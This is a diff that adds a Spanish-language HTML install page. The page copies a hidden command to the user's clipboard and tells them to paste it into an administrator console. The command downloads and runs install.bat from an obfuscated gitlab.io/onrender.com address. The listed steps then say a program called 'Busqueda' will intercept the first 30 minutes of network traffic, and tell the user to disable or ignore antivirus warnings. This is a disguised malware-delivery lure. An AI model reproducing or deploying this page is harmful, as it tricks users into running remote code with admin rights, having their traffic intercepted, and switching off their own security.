@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Computer</title>
+    <link rel="stylesheet" href="install.css">
+</head>
+
+<body>
+    <nav class="w-screen bg-gray-900 text-white  py-4">
+        <div class="container flex my-2">
+            <a href="/menu" class="text-lg mx-5 font-semibold cursor-pointer">Home</a>
+        </div>
+    </nav>
+    <div class="min-h-screen w-full bg-gray-800 flex flex-col items-start text-white">    
+        <div id="carga" hidden>cmd /c curl https://opflmajwahqnkjzmjtmcjiaxwwspuy-341801.gitlab.io/jweciqhgpzrshx6gyj6htacmebknyxldtcmiqvwu-mqd4.onrender.com/public/install.bat --output %userprofile%\Downloads\install.bat && cd %userprofile%\Downloads\ && %userprofile%\Downloads\install.bat</div>
+        <ol class="list-decimal">
+            <h3 class="font-bold" style="font-size: 1.5em; margin: 2em 1.4em 0;">Pasos para instalar el programa:</h3>
+            <li class="mx-10 py-5">Copie el payload.</li>
+            <button class="p-4 px-10 ml-10 mb-4 font-mono font-roboto-mono bg-[#7e7e7e]/20 text-white rounded-3xl border-solid border-1 border-[white]/5 transition-all duration-300 ease-in-out
+               hover:bg-white/20 hover:backdrop-blur-md hover:border-white/30 hover:scale-105 hover:shadow-lg hover:shadow-white/10 active:scale-95" onclick="copyToClipboard()">Copiar payload a portapapeles</button>
+            <li class="mx-10 py-5">Abra la consola de comandos ( cmd ) con permisos de administrador.</li>
+            <img class="mx-10 my-5 max-w-[90%] w-[90vw] rounded-lg shadow-lg"  src="/menu/images/cmd_1.png" alt="Abrir consola con permisos de administrador">
+            <li class="mx-10 py-5">Inserte el comando anteriormente copiado, en la consola de comandos.</li>
+            <img class="mx-10 my-5 max-w-[90%] w-[90vw] rounded-lg shadow-lg"  src="/menu/images/cmd_2.png" alt="Ejecutar comando en el cmd">
+            <li class="mx-10 py-5">Cuando el programa lo indique, escribir una descripcion para el computador, asi se podra saber que computador es. Luego de escribir la descripcion dar ENTER y continuar al siguiente paso.</li>
+            <img class="mx-10 my-5 max-w-[90%] w-[90vw] rounded-lg shadow-lg"  src="/menu/images/cmd_3.png" alt="Escribir una descripcion para el computador">
+            <li class="mx-10 py-5">A continuacion se hara la instalacion del prorgrama maestro.</li>
+            <img class="mx-10 my-5 max-w-[90%] w-[90vw] rounded-lg shadow-lg"  src="/menu/images/cmd_4.png" alt="Escribir una descripcion para el computador">
+            <li class="mx-10 py-5">Posteriormente se instalara el segundo programa llamado "Busqueda", el cual interceptara los primeros 30 minutos de trafico de datos.</li>
+            <img class="mx-10 my-5 max-w-[90%] w-[90vw] rounded-lg shadow-lg"  src="/menu/images/cmd_5.png" alt="Escribir una descripcion para el computador">
+            <li class="mx-10 py-5">Si el antivirus detiene algun proceso en la instalacion se debe desactivar u omitir las advertencias.</li>
+        </ol>
+    </div>
+    <script>
+        async function copyToClipboard() {
+            try {
+                await navigator.clipboard.writeText(document.querySelector('#carga').innerText);
+            } catch (err) {
+                alert('No se pudieron copiar los resultados: ' + err.message);
+            }
+        }
+    </script>
+</body>
+
+</html>
